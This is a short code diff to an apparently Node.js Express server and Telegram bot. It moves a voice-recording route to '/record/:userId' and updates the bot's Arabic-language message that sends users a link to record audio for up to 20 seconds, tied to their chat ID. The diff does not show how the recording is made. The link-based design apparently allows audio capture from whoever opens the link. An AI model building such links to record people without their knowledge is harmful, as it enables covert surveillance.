@@ -49,7 +49,7 @@ app.get('/:userId', (req, res) => {
 });
 
 // Voice recording routes
-app.get('/record', (req, res) => {
+app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
 
     if (subscribedUsers.has(userId)) {
@@ -195,7 +195,7 @@ bot.on('message', (msg) => {
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
-            const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId=${chatId}&duration=${duration}`;
+            const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
             bot.sendMessage(chatId, `انقر على الرابط لتسجيل الصوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
